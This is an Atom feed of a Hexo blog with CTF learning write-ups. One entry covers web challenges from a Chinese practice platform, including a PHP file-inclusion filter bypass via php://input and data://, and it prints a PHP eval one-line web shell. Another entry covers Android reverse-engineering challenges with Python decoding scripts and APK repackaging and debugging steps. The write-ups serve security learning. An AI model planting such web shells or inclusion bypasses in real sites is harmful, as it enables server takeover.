<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Bxb0&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.bxnop.cn/"/>
  <updated>2021-03-22T04:41:32.723Z</updated>
  <id>https://www.bxnop.cn/</id>
  
  <author>
    <name>ooo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>web学习之刷题</title>
    <link href="https://www.bxnop.cn/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/"/>
    <id>https://www.bxnop.cn/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/</id>
    <published>2021-03-12T15:15:18.000Z</published>
    <updated>2021-03-22T04:41:32.723Z</updated>
    
    <content type="html"><![CDATA[<p>从各处web题学习。</p><a id="more"></a><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>从提示初始页面，想到index.php。</p><p>访问index.php发现又跳到1.php页面了，但可以看到index.php，从响应头中看到flag，只是状态码为302。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210312231932538.png" alt="image-20210312231932538"></p><p>对于状态码302，可以简单理解为该资源原本存在，但被临时改变了位置。一般被替换了位置后，我们再访问的时候就会自动重定向到一个设置好的网页，且改被设置好的网页在响应头的Location又给出，如上图。</p><h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>考了一个robots.txt的协议，首先读了一下题目提供的关于这个的英文文档，总结一下是：在遵循这个协议的搜索引擎访问一个网站时，首先要做的就是访问该网站下的robots.txt文件，若没有的话则表示可以访问该网站下的所有内容，若发现的话，就读取这个文件，并遵守这个文件中的协议指令只访问被允许访问的内容。</p><p>举一个例子：</p><blockquote><p>禁止所有搜索引擎访问本网站的所有内容：<br><strong>User-agent: *</strong></p><p><strong>Disallow: /</strong></p></blockquote><p>所以说这个文件限制了不被允许访问的文件路径，这其实也就间接泄露了这个网站的文件目录结构。</p><p>访问robots.txt得到：<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313101940154.png" alt="image-20210313101940154"></p><p>访问fl0g.php得到flag。</p><h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>我不知道这个版本的php有这个漏洞，也没有意识去github搜相关版本看是否有相关漏洞。</p><p>这里直接看了wp，知道有一个远程命令执行漏洞，网上利用方式也是很多，目前也不会自己写利用，</p><p>直接使用现成的打了一下。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313104841755.png" alt="image-20210313104841755"></p><h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>首先记一下2个包含的区别：</p><ul><li>require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。</li><li>include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。</li></ul><p>文件包含漏洞。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313152324318.png" alt="image-20210313152324318"></p><p>使用了strstr函数匹配<strong>“php://”</strong>字符串进行过滤。</p><blockquote><p>php://input</p><p>我们可以利用它直接写入php文件。</p></blockquote><p>现在要做的就是绕过上面的字符串过滤，可以使用strstr（）函数匹配大小写的特性。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313152604534.png" alt="image-20210313152604534"></p><p>看wp学习。</p><p>这个题还可以使用data://伪协议。</p><p>使用方法：<strong>data://text/plain;base64,base64编码后的数据</strong>（也就是我们要执行的命令）<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313153729207.png" alt="image-20210313153729207"></p><p>另外还有可以传入一句话木马。<strong>这里我试了下，为什么；后一定要空格才对。</strong></p><p><strong><?php eval($_POST[root]); ?></strong></p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210313155834858.png" alt="image-20210313155834858"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从各处web题学习。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://www.Bxnop.cn/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>Andriod之CTF学习</title>
    <link href="https://www.bxnop.cn/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.bxnop.cn/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-02-05T07:09:15.000Z</published>
    <updated>2021-03-22T04:40:46.001Z</updated>
    
    <content type="html"><![CDATA[<p>从各处Android题来学习。</p><a id="more"></a><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><h3 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h3><p>来到关键事件，取出输入后传入a方法，在a方法又把输入传入了实例化的一个a类对象中的a方法。全是a。。最后调用native层的ncheck函数。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205171126725.png" alt="image-20210205171126725"></p><p>a类中的a方法一个换表的base64，native层ncheck函数进行简单加密后与密文对比。</p><p>native层有JNIEnv方法，ida不会自动识别，将指定变量改一下类型就行了。<strong>JNIEnv*</strong></p><p>用一下ida-python。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">base = [<span class="string">'i'</span>, <span class="string">'5'</span>, <span class="string">'j'</span>, <span class="string">'L'</span>, <span class="string">'W'</span>, <span class="string">'7'</span>, <span class="string">'S'</span>, <span class="string">'0'</span>, <span class="string">'G'</span>, <span class="string">'X'</span>, <span class="string">'6'</span>, <span class="string">'u'</span>, <span class="string">'f'</span>, <span class="string">'1'</span>, <span class="string">'c'</span>, <span class="string">'v'</span>, <span class="string">'3'</span>, <span class="string">'n'</span>, <span class="string">'y'</span>, <span class="string">'4'</span>, <span class="string">'q'</span>, <span class="string">'8'</span>, <span class="string">'e'</span>, <span class="string">'s'</span>, <span class="string">'2'</span>, <span class="string">'Q'</span>, <span class="string">'+'</span>, <span class="string">'b'</span>, <span class="string">'d'</span>, <span class="string">'k'</span>, <span class="string">'Y'</span>, <span class="string">'g'</span>, <span class="string">'K'</span>, <span class="string">'O'</span>, <span class="string">'I'</span>, <span class="string">'T'</span>, <span class="string">'/'</span>, <span class="string">'t'</span>, <span class="string">'A'</span>, <span class="string">'x'</span>, <span class="string">'U'</span>, <span class="string">'r'</span>, <span class="string">'F'</span>, <span class="string">'l'</span>, <span class="string">'V'</span>, <span class="string">'P'</span>, <span class="string">'z'</span>, <span class="string">'h'</span>, <span class="string">'m'</span>, <span class="string">'o'</span>, <span class="string">'w'</span>, <span class="string">'9'</span>, <span class="string">'B'</span>, <span class="string">'H'</span>, <span class="string">'C'</span>, <span class="string">'M'</span>, <span class="string">'D'</span>, <span class="string">'p'</span>, <span class="string">'E'</span>, <span class="string">'a'</span>, <span class="string">'J'</span>, <span class="string">'R'</span>, <span class="string">'Z'</span>, <span class="string">'N'</span>]</span><br><span class="line">base1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">s = <span class="string">'MbT3sQgX039i3g==AQOoMQFPskB1Bsc7'</span></span><br><span class="line">s = list(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">2</span>):</span><br><span class="line">    s[<span class="number">2</span>*i], s[<span class="number">2</span>*i+<span class="number">1</span>] = s[<span class="number">2</span>*i+<span class="number">1</span>], s[<span class="number">2</span>*i]</span><br><span class="line">s = s[<span class="number">16</span>:<span class="number">32</span>]+s[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">'='</span>:</span><br><span class="line">        ans += [base.index(i)]</span><br><span class="line">flag = [base1[i] <span class="keyword">for</span> i <span class="keyword">in</span> ans]</span><br><span class="line">flag = base64.b64decode(<span class="string">''</span>.join(flag)+<span class="string">'=='</span>)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;just_ANot#er_@p3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h3><p>这个题涉及的知识挺多，对初学安卓挺不错的。</p><p>从010editor发现了ANDROID BACKUP，安卓备份文件。开始出现新的知识了，找了一篇文章讲这个的学习了一下，讲的真好。<a href="https://blog.csdn.net/qq_31387043/article/details/51452782" target="_blank" rel="noopener">Android中allowBackup</a>，知道了这个可以用android-backup-extractor(abe)工具来解析ab文件。</p><p>对于ab文件，前24字节类似文件头的东西，若文件是加密的话，可以在前24字节中看见AES-256标志，否则出现none字符。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205222314992.png" alt="image-20210205222314992"></p><p>使用<code>java -jar abe.jar unpack 1.ab 1.tar</code>解析文件，这样得到一个tar压缩包。解压后发现有一个apk文件和一些数据库文件。</p><p>上学期学习了java和mysql这2门课程，真是好。hha。。</p><p>看了看反编译apk中的代码，发现创建表操作和其中包含的flag文件：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205222830438.png" alt="image-20210205222830438"></p><p>再加上外面的数据库文件，可以猜测我们的flag就那些数据库中。</p><p>查询相关资料，知道了这个要用DB Browser for SQLite中的SQLCiper的打开，下载后准备打开数据库文件发现要密码。这也和猜想的一样，题目就是要让我们找这个密码。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205223604786.png" alt="image-20210205223604786"></p><p>对于key，通过传入Stranger和123456经过a包中的a，b类中的方法加密。a类中的方法就是字符串截取操作，b类中的方法一个MD5一个SHA-1。程序是可以调试的，所以直接调试得到key。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205223928065.png" alt="image-20210205223928065"></p><p>打开数据库得到一串base64字符串，解密得到flag。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210205224023165.png" alt="image-20210205224023165"></p><h3 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy-apk"></a>easy-apk</h3><p>找到主活动，就一个变表的base64编码，python简单写一下就好：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">base = [<span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>,</span><br><span class="line">        <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>,</span><br><span class="line">        <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>,</span><br><span class="line">        <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'Z'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'e'</span>,</span><br><span class="line">        <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'+'</span>, <span class="string">'/'</span>]</span><br><span class="line">enc = <span class="string">'5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs='</span></span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">'='</span>:</span><br><span class="line">        ans += [base.index(i)]</span><br><span class="line">ans = <span class="string">''</span>.join([<span class="string">'&#123;:0&gt;6&#125;'</span>.format(bin(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> ans])</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ans)//<span class="number">8</span>):</span><br><span class="line">    flag += chr(int(ans[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)], <span class="number">2</span>))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#05397c42f9b6da593a3644162d36eb01</span></span><br></pre></td></tr></table></figure><h3 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h3><p>简单考了java中对动态链接库的调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = list(<span class="string">'f72c5a36569418a20907b55be5bf95ad'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">2</span>):</span><br><span class="line">    s[<span class="number">2</span>*i], s[<span class="number">2</span>*i+<span class="number">1</span>] = s[<span class="number">2</span>*i+<span class="number">1</span>], s[<span class="number">2</span>*i]</span><br><span class="line">flag = s[len(s)//<span class="number">2</span>:len(s)] + s[<span class="number">0</span>:len(s)//<span class="number">2</span>]</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br><span class="line"><span class="comment">#90705bb55efb59da7fc2a5636549812a</span></span><br></pre></td></tr></table></figure><h3 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h3><p>就是读繁琐的java代码，理解程序加密流程。</p><p>考点：java代码的阅读能力；简单的置换加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'wigwrkaugala'</span></span><br><span class="line">base = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">a = [<span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>,</span><br><span class="line">     <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>,</span><br><span class="line">     <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">16</span>]</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    ans += [a[base.index(i)]]</span><br><span class="line">print(ans)</span><br><span class="line">b = [<span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>,</span><br><span class="line">         <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">25</span>]</span><br><span class="line">base = list(base)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">    flag += base[b[i]]</span><br><span class="line">    b = b[<span class="number">1</span>:len(b)] + [b[<span class="number">0</span>]]</span><br><span class="line">    base = base[<span class="number">1</span>:len(base)] + [base[<span class="number">0</span>]]</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br><span class="line"><span class="comment">#venividivkcr</span></span><br></pre></td></tr></table></figure><h3 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h3><p>输入字符和和so层函数获得的字符串经过md5加密后进行比较。</p><p>从这个题练习了下调试so。注意：安卓模拟器不能调试arm架构的so文件，还是最好用真机来调试native层。</p><p>首先是直接模拟程序跑flag：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">46</span>,  <span class="number">54</span>,  <span class="number">66</span>,  <span class="number">76</span>,  <span class="number">95</span>, <span class="number">191</span>, <span class="number">224</span>,  <span class="number">58</span>, <span class="number">168</span>, <span class="number">195</span>, </span><br><span class="line">   <span class="number">32</span>,  <span class="number">99</span>, <span class="number">137</span>, <span class="number">183</span>, <span class="number">192</span>,  <span class="number">28</span>,  <span class="number">29</span>,  <span class="number">68</span>, <span class="number">194</span>,  <span class="number">40</span>, </span><br><span class="line">  <span class="number">127</span>, <span class="number">237</span>,   <span class="number">2</span>,  <span class="number">14</span>,  <span class="number">93</span>, <span class="number">102</span>, <span class="number">143</span>, <span class="number">152</span>, <span class="number">181</span>, <span class="number">183</span>, </span><br><span class="line">  <span class="number">208</span>,  <span class="number">22</span>,  <span class="number">77</span>, <span class="number">131</span>, <span class="number">248</span>, <span class="number">251</span>,   <span class="number">1</span>,  <span class="number">67</span>,  <span class="number">71</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">"Hello Ph0en1x"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v6 = <span class="built_in">strlen</span>(b);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ( i = <span class="keyword">sizeof</span>(a) - <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> v3 = a[i] + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *v7 = &amp;a[i - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> v4 = i % v6;</span><br><span class="line">a[i] = (b[v4] ^ (v3 - *v7)) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">0</span>] = (a[<span class="number">0</span>] ^ <span class="number">0x48</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(a)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(a[i]+<span class="number">1</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag&#123;Ar3_y0u_go1nG_70_scarborough_Fair&#125;</span></span><br></pre></td></tr></table></figure><p>然后就是调试了。简单记一下流程：</p><p>准备工作：</p><p>1.解包程序，<strong>apktool.bat d a.apk</strong>。在AndroidManifest.xml中的<strong>application</strong>后面加上android:debuggable=”true”。</p><p>2.重新打包程序，<strong>apktool.bat b a</strong>，这时候在a文件夹中的dist下的就是目标重新打包后的程序。</p><p>3.对重打包后的apk进行签名。</p><ul><li>生成签名文件：keytool -genkey -alias abc.keystore -keyalg RSA -validity 20000 -keystore abc.keystore</li><li>进行签名：jarsigner -verbose -keystore abc.keystore -signedjar b.apk a.apk abc.keystore</li></ul><p>接下来把程序装入模拟器，运行，进行调试，操作和常规的调试elf文件差不多了。</p><p>以调试模式启动程序：<strong>adb shell am start -D -n 包名/.活动名</strong></p><p>端口转发：<strong>adb forward tcp:23946 tcp:23946</strong></p><p>因为我用的模拟器，这里用了x86架构的so文件才调试上，虽然有点不能理解，为什么模拟器里程序都能运行，说明对so文件是运行了的啊，那调试怎么就不行呢（<strong>在之后突然想到的想法补充：可能是题目有对应结构的so文件，只是没提供给我们</strong>），且android_server在模拟器里也可以运行的。。其实这里的提示可以看见它调用的是<strong>1/lib/x86/下的so</strong>。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210206212259169.png" alt="image-20210206212259169"></p><p>嗯，，初学一个东西开始总是有很多疑惑的，等接触多了来慢慢理解。</p><p>ida中成功附加上程序后，在Modules模块找到我们要调试的so文件，再继续找到我们要调试的函数。</p><p>得到结果：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210206210632330.png" alt="image-20210206210632330"></p><h3 id="黑客精神"><a href="#黑客精神" class="headerlink" title="黑客精神"></a>黑客精神</h3><p>出现新知识点：so文件中的函数为动态注册。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210207182454660.png" alt="image-20210207182454660"></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210207182859376.png" alt="image-20210207182859376"></p><p>然后就是一个加上文件读写操作的异或加密。</p><p>2个涉及的函数功能：通常连用来计算出一个文件中数据的字节数。</p><ul><li>C 库函数 <strong>int fseek(FILE *stream, long int offset, int whence)</strong> 设置流 <strong>stream</strong> 的文件位置为给定的偏移 <strong>offset</strong>，参数 offset 意味着从给定的 <strong>whence</strong> 位置查找的字节数。</li><li>C 库函数 <strong>long int ftell(FILE *stream)</strong> 返回给定流 stream 的当前文件位置。</li></ul><p>接下来解题部分：直接输入密文值，在文件中找到异或后的值即是flag。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210207184727271.png" alt="image-20210207184727271"></p><h3 id="easy-dex"><a href="#easy-dex" class="headerlink" title="easy-dex"></a>easy-dex</h3><p>题目得到flag的难度不大，但涉及的知识还需要多学习。</p><p>jadx中发现没有dex文件，从AndroidMainfest.xml看到：NativeActivity，安卓进行ndk开发使用的，所以应该是转战so文件中了。<img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/ncjKwbuX1qBF6ke.png" alt="image-20210208171101099"></p><p>找到android_main函数，首先是进行解密了2个字符串，打印出来就是app包路径相关的。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208171841729.png" alt="image-20210208171841729"></p><p>然后从打印的log，可以帮助识别程序的功能和流程。就是在10s内摇动手机100次，然后会使用这之间的表示次数的数据来解密一些数据代码：就是把enc分为10组，然后前8组分别和9, 19, 29…异或解密，后2组和89异或解密。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172040397.png" alt="image-20210208172040397"></p><p>然后解压缩数据，写入文件。从上面打印出的路径信息，可以猜测这个就是生成一个dex文件。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172227628.png" alt="image-20210208172227628"></p><p>仿照程序逻辑使用idapython解密数据后写入文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line">addr = <span class="number">0x07004</span></span><br><span class="line">length = <span class="number">0x3CA10</span></span><br><span class="line">n = length//<span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">    a = get_byte(addr+i)</span><br><span class="line">    b = i//n</span><br><span class="line">    b = <span class="number">8</span> <span class="keyword">if</span> b &gt; <span class="number">8</span> <span class="keyword">else</span> b </span><br><span class="line">    c = b*<span class="number">10</span>+<span class="number">9</span></span><br><span class="line">    data += [a^c]</span><br><span class="line">data = bytes(data)</span><br><span class="line">f = open(<span class="string">'ans.Z'</span>, <span class="string">'wb'</span>)</span><br><span class="line">f.write(data)</span><br><span class="line">f.close()</span><br><span class="line">print(<span class="string">"-------success-----------"</span>)</span><br></pre></td></tr></table></figure><p>然后就是花了点时间的的uncompress操作，试了试linux下的发现不行。然后搜索文件头：<strong>78 9c</strong>，发现可以使用<a href="http://aluigi.org/mytoolz/offzip.zip" target="_blank" rel="noopener">Aluigi’s offzip</a> ：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172543745.png" alt="image-20210208172543745"></p><p>提取出文件其中的数据，得到一个dex文件：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175926442.png" alt="image-20210208175926442"></p><p>分析dex文件。发现有很多id，在res\values\public.xml中找到对应id的name，然后再到strings中找到对应name的字符串。对其注释了一下：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172846985.png" alt="image-20210208172846985"></p><p>看了一圈后，可以知道我们输入的经过一种加密算法后与密文比较，而<strong>I have a male fish and a female fish.</strong>是key，看到只是取了它的32位，然后是key判断。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208173320567.png" alt="image-20210208173320567"></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208173332255.png" 